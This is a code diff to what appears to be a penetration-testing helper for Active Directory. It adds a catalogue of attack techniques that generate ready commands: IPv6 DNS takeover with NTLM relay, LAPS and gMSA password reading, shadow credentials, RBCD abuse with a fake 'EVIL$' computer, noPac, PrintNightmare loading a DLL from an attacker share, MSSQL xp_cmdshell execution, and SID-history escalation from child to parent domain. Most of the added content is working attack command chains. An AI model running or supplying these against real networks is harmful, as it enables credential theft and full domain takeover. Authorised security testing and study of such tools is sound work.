@@ -384,6 +384,17 @@ def build_catalog():
            lambda st: f"coercer coerce -t {st.dc_ip} -l <attacker-ip>   # or PetitPotam.py",
            tool=_first("coercer", "PetitPotam.py")))
 
+    A(Tech("mitm6", P_FOOTHOLD, "mitm6 - IPv6 DHCPv6/DNS takeover -> relay", MANUAL, 2,
+           "No creds > MITM > IPv6 (DHCPv6 preferred over IPv4)",
+           "Windows prefers IPv6: spoof DHCPv6 + WPAD to become the victims' DNS, then relay the "
+           "coerced auth to LDAPS to add a computer / grant RBCD.",
+           lambda st: True,
+           lambda st: (
+               f"mitm6 -d {st.domain or '<dom>'} -i tun0\n"
+               f"{impacket('ntlmrelayx') or 'impacket-ntlmrelayx'} -6 -t ldaps://{st.dc_ip} "
+               f"-wh fakewpad.{st.domain or '<dom>'} --delegate-access -smb2support"),
+           tool="mitm6"))
+
     # ===================================================================== #
     #  PHASE 1 - username(s) known
     # ===================================================================== #
@@ -475,6 +486,26 @@ def build_catalog():
                        f"--admin-count --users"),
            tool=nxc_bin()))
 
+    A(Tech("laps", P_CREDS, "Read LAPS local-admin passwords", ENUM, 1,
+           "Creds > LDAP > ms-Mcs-AdmPwd / Windows LAPS",
+           "Any principal with the LAPS read right gets a machine's local Administrator password in "
+           "cleartext - instant local admin, and often the same reader covers many hosts.",
+           lambda st: st.have_creds,
+           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} --laps   # legacy ms-Mcs-AdmPwd + Windows LAPS",
+           tool=nxc_bin(),
+           success=re.compile(r"AdmPwd|Password|Administrator", re.I)))
+
+    A(Tech("gmsa", P_CREDS, "Read gMSA managed passwords", ENUM, 1,
+           "Creds > LDAP > msDS-ManagedPassword / gMSA",
+           "If you (or a group you're in) are on a gMSA's PrincipalsAllowedToRetrieveManagedPassword, "
+           "you can read its NT hash and act as that - frequently high-privileged - service account.",
+           lambda st: st.have_creds,
+           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} --gmsa\n"
+                       f"# alt: gMSADumper.py -u {st.user or '<me>'} {st.secret_flag() or '-p <pw>'} "
+                       f"-d {st.domain or '<dom>'} -l {st.dc_ip}"),
+           tool=nxc_bin(),
+           success=re.compile(r"ManagedPassword|gMSA|Account:|NTLM", re.I)))
+
     A(Tech("adcs-find", P_CREDS, "Certipy - find vulnerable cert templates (ESC1-16)", ENUM, 0,
            "Creds > ADCS > template enumeration",
            "AD CS misconfigs (ESC1/ESC8...) are a reliable domain-takeover path - enumerate first.",
@@ -493,6 +524,15 @@ def build_catalog():
                        f"{st.impacket_target_noat()} {dcflag(st)}"),
            tool=impacket("findDelegation"),
            success=re.compile(r"Unconstrained|Constrained|RBCD", re.I)))
+
+    A(Tech("trust-enum", P_CREDS, "Enumerate domain / forest trusts", ENUM, 2,
+           "Creds > LDAP > trustedDomain objects",
+           "Trusts open escalation to other domains - map them early; a child->parent edge is a "
+           "reliable route to Enterprise Admin.",
+           lambda st: st.have_creds,
+           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M enum_trusts",
+           tool=nxc_bin(),
+           success=re.compile(r"trust|Parent|Child|Forest", re.I)))
 
     # Phase 2 exploitation - printed only
     A(Tech("crack", P_CREDS, "Crack roasted hashes offline", MANUAL, 1,
@@ -513,6 +553,21 @@ def build_catalog():
                        "targetedKerberoast.py -d <dom> -u <me> -p <pw>   # via GenericWrite"),
            tool=None))
 
+    A(Tech("shadow-cred", P_CREDS, "Shadow Credentials (msDS-KeyCredentialLink)", MANUAL, 1,
+           "Creds > ACL > AddKeyCredentialLink -> PKINIT",
+           "With GenericWrite/GenericAll/AddKeyCredentialLink over a user or computer (from "
+           "BloodHound), add a key credential, then PKINIT for a TGT and the account's NT hash - "
+           "no password reset, and it's quietly reversible.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"certipy shadow auto -u {st.user or '<me>'}@{st.domain or '<dom>'} "
+               f"{st.certipy_secret()} -account '<target_user_or_computer$>' -dc-ip {st.dc_ip}\n"
+               "# manual chain (pywhisker + PKINITtools):\n"
+               "pywhisker.py -d <dom> -u <me> -p <pw> --target '<target>' --action add\n"
+               "gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pw> <dom>/<target> t.ccache\n"
+               "getnthash.py -key <as-rep-key> <dom>/<target>   # UnPAC-the-hash -> NT hash"),
+           tool="certipy"))
+
     A(Tech("adcs-exploit", P_CREDS, "Exploit an ADCS template (ESC1 etc.)", MANUAL, 1,
            "Creds > ADCS > request-as / relay",
            "Request a cert as a privileged user, then auth with it for a TGT / NT hash.",
@@ -520,6 +575,123 @@ def build_catalog():
            lambda st: ("certipy req -u <me>@<dom> -p <pw> -ca <CA> -template <vuln> -upn administrator@<dom> -dc-ip <dc>\n"
                        "certipy auth -pfx administrator.pfx -dc-ip <dc>     # -> TGT + NT hash"),
            tool="certipy"))
+
+    A(Tech("pass-the-cert", P_CREDS, "Pass-the-Certificate (auth with a PFX)", MANUAL, 2,
+           "Creds > ADCS > PKINIT with an existing certificate",
+           "Already hold a certificate (from ESC, shadow creds, or loot)? Authenticate with it for a "
+           "TGT and the account's NT hash - works even when the password/hash is unknown.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"certipy auth -pfx <cert.pfx> -dc-ip {st.dc_ip}            # -> TGT + NT hash\n"
+               "# key-only (PKINITtools):\n"
+               "gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass <pw> "
+               f"{st.domain or '<dom>'}/<user> out.ccache\n"
+               "getnthash.py -key <as-rep-key> "
+               f"{st.domain or '<dom>'}/<user>   # UnPAC-the-hash"),
+           tool="certipy"))
+
+    A(Tech("maq", P_CREDS, "Read MachineAccountQuota (gates RBCD / noPac)", ENUM, 2,
+           "Creds > LDAP > ms-DS-MachineAccountQuota",
+           "If MAQ > 0 any user can add a computer account - the pivot both RBCD and noPac rely on.",
+           lambda st: st.have_creds,
+           lambda st: f"{nxc} ldap {st.target} {st.nxc_auth()} -M maq",
+           tool=nxc_bin(),
+           success=re.compile(r"MachineAccountQuota", re.I)))
+
+    A(Tech("rbcd", P_CREDS, "Resource-Based Constrained Delegation abuse", MANUAL, 1,
+           "Creds > Kerberos > RBCD (write over a computer + MAQ>0)",
+           "With GenericWrite/GenericAll over a computer (from BloodHound) and MAQ>0: add a "
+           "machine, set RBCD, then getST a CIFS ticket as Administrator -> SYSTEM on that host.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{impacket('addcomputer') or 'impacket-addcomputer'} "
+               f"{st.impacket_target_noat()} -computer-name 'EVIL$' -computer-pass 'Evil1234!' {dcflag(st)}\n"
+               f"{impacket('rbcd') or 'impacket-rbcd'} -delegate-from 'EVIL$' "
+               f"-delegate-to '<TARGET$>' -action write {st.impacket_target_noat()} {dcflag(st)}\n"
+               f"{impacket('getST') or 'impacket-getST'} -spn cifs/<target.fqdn> "
+               f"-impersonate administrator {dcflag(st)} {st.domain or '<dom>'}/EVIL\\$:'Evil1234!'\n"
+               "export KRB5CCNAME=administrator.ccache\n"
+               f"{impacket('psexec') or 'impacket-psexec'} -k -no-pass <target.fqdn>"),
+           tool=impacket("rbcd")))
+
+    A(Tech("unconstrained", P_CREDS, "Abuse unconstrained delegation (capture a DC TGT)", MANUAL, 2,
+           "Creds > Kerberos > unconstrained delegation",
+           "If you control a host trusted for unconstrained delegation, coerce a DC to authenticate "
+           "to it; the DC's TGT lands in that host's memory -> extract it and DCSync.",
+           lambda st: st.have_creds,
+           lambda st: (
+               "# on the unconstrained host, watch for inbound TGTs:\n"
+               "Rubeus.exe monitor /interval:5 /nowrap\n"
+               "# coerce the DC to authenticate to that host:\n"
+               f"printerbug.py {st.impacket_target_noat()}@<dc> <unconstrained_host>\n"
+               "# reuse the captured DC$ TGT, then DCSync:\n"
+               "Rubeus.exe ptt /ticket:<b64>   #  mimikatz lsadump::dcsync /user:<dom>\\krbtgt"),
+           tool=None))
+
+    A(Tech("constrained", P_CREDS, "Abuse constrained delegation (S4U getST)", MANUAL, 2,
+           "Creds > Kerberos > constrained delegation (S4U2Self/Proxy)",
+           "If your account has msDS-AllowedToDelegateTo set, S4U2Self+S4U2Proxy gets a service "
+           "ticket to the allowed SPN as any user (e.g. Administrator); -altservice swaps to another "
+           "service (e.g. cifs) on the same host.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{impacket('getST') or 'impacket-getST'} -spn <allowed_spn>/<target.fqdn> "
+               f"-impersonate administrator {dcflag(st)} {st.impacket_target_noat()}\n"
+               "# swap the target service (same host) with -altservice:\n"
+               f"{impacket('getST') or 'impacket-getST'} -spn <allowed_spn> -altservice cifs "
+               f"-impersonate administrator {dcflag(st)} {st.impacket_target_noat()}\n"
+               "export KRB5CCNAME=administrator.ccache\n"
+               f"{impacket('psexec') or 'impacket-psexec'} -k -no-pass <target.fqdn>"),
+           tool=impacket("getST")))
+
+    A(Tech("nopac", P_CREDS, "noPac - sAMAccountName spoofing (CVE-2021-42278/42287)", MANUAL, 1,
+           "Creds > Kerberos > noPac (MAQ > 0, unpatched DC)",
+           "Any valid account + MAQ>0 against an unpatched DC -> impersonate a DC -> SYSTEM. "
+           "Check the nxc module first; it's patch-dependent but common in labs.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{nxc} smb {st.dc_ip} {st.nxc_auth()} -M nopac          # detection\n"
+               f"noPac.py {st.impacket_target_noat()} -dc-ip {st.dc_ip} -dc-host <dc-hostname> "
+               "--impersonate administrator -use-ldap -shell\n"
+               "# or dump instead of shell:  ... -dump -just-dc-user <dom>/krbtgt"),
+           tool=None))
+
+    A(Tech("print-abuse", P_CREDS, "PrintNightmare / PrintSpoofer -> SYSTEM", MANUAL, 2,
+           "Creds > Spooler > CVE-2021-1675/34527 (remote) or SeImpersonate (local)",
+           "A vulnerable Print Spooler is a dependable SYSTEM path: PrintNightmare runs a DLL as a "
+           "domain user over RPC; PrintSpoofer/potatoes abuse SeImpersonate once you have a service "
+           "shell on the box.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{nxc} smb {st.target} {st.nxc_auth()} -M printnightmare   # detection scan\n"
+               "# remote (domain user -> SYSTEM via malicious DLL on a share):\n"
+               f"printnightmare.py {st.impacket_target_noat()}@{st.target} "
+               "-dll '\\\\<attacker>\\share\\add_user.dll'\n"
+               "# local (you already have a SeImpersonate service shell):\n"
+               "PrintSpoofer64.exe -i -c cmd      # or GodPotato / JuicyPotatoNG"),
+           tool=None))
+
+    A(Tech("mssql-enum", P_CREDS, "MSSQL access, privileges & linked servers", ENUM, 1,
+           "Creds > MSSQL > access / impersonation / trusted links",
+           "Domain creds frequently log into MSSQL; check for sysadmin, EXECUTE AS impersonation, "
+           "and linked servers you can hop with EXECUTE AT - all classic AD pivots.",
+           lambda st: st.have_creds,
+           lambda st: f"{nxc} mssql {st.target} {st.nxc_auth()} -M mssql_priv",
+           tool=nxc_bin(),
+           success=re.compile(r"\[\+\]|sysadmin|Pwn3d|Linked", re.I)))
+
+    A(Tech("mssql-exec", P_CREDS, "MSSQL -> RCE (xp_cmdshell / impersonation / links)", MANUAL, 1,
+           "Creds > MSSQL > command execution",
+           "Turn MSSQL access into a shell: enable xp_cmdshell, impersonate a sysadmin login, "
+           "or pivot across a trusted linked server with EXECUTE AT.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{impacket('mssqlclient') or 'impacket-mssqlclient'} {st.impacket_target()} -windows-auth\n"
+               "# then, inside the SQL shell:\n"
+               "enable_xp_cmdshell;  xp_cmdshell whoami\n"
+               "EXECUTE AS LOGIN = 'sa';  SELECT SYSTEM_USER;           -- impersonation\n"
+               "EXEC ('xp_cmdshell ''whoami''') AT [LINKED\\INSTANCE];  -- linked-server hop"),
+           tool=impacket("mssqlclient")))
 
     # ===================================================================== #
     #  PHASE 3 - local admin on a host
@@ -575,6 +747,22 @@ def build_catalog():
            lambda st: (f"{impacket('ticketer') or 'impacket-ticketer'} -nthash <krbtgt> "
                        f"-domain-sid <SID> -domain {st.domain or '<dom>'} administrator"),
            tool=impacket("ticketer")))
+
+    A(Tech("trust-escalate", P_DOMAIN, "Child -> parent domain escalation (SID history)", MANUAL, 2,
+           "Domain dominance > trusts > child-to-parent",
+           "DA on a child domain gets you Enterprise Admin: forge an inter-realm TGT with the "
+           "parent's Enterprise Admins SID (519) in SID history, then DCSync the parent.",
+           lambda st: st.domain_admin,
+           lambda st: (
+               f"# automated (needs the child krbtgt):\n"
+               f"{impacket('raiseChild') or 'impacket-raiseChild'} "
+               f"<child_dom>/<da_user>:<pw>@<child_dc>\n"
+               "# manual - forge the inter-realm TGT by hand:\n"
+               f"{impacket('ticketer') or 'impacket-ticketer'} -nthash <child_krbtgt> "
+               "-domain-sid <child_sid> -domain <child_dom> "
+               "-extra-sid <parent_sid>-519 -spn krbtgt/<parent_dom> hacker\n"
+               "# then DCSync the parent DC with the forged ticket"),
+           tool=impacket("raiseChild")))
 
     return cat
 
@@ -673,6 +861,16 @@ def _learn(tech, out, st):
         good("  -> local admin confirmed; phase 3 (dumping) is now in play")
     if tech.tid in ("kerberoast", "asrep-user", "asrep-authed", "asrep-nopreauth"):
         st.facts.add("roast_hashes")
+    if tech.tid == "maq":
+        m = re.search(r"MachineAccountQuota[:\s]+(\d+)", out, re.I)
+        if m and int(m.group(1)) > 0:
+            st.facts.add("can_add_computer")
+            good(f"  -> MachineAccountQuota = {m.group(1)}: RBCD and noPac are in play")
+        elif m:
+            warn("  -> MachineAccountQuota = 0: RBCD/noPac need a pre-existing computer you control")
+    if tech.tid == "mssql-enum" and re.search(r"sysadmin|Pwn3d", out, re.I):
+        st.facts.add("mssql_admin")
+        good("  -> MSSQL sysadmin/exec: xp_cmdshell path is open (see mssql-exec)")
     if re.search(r"signing:\s*False", out, re.I):
         st.facts.add("smb_signing_off")
         warn("  -> SMB signing not required: NTLM relay is viable")
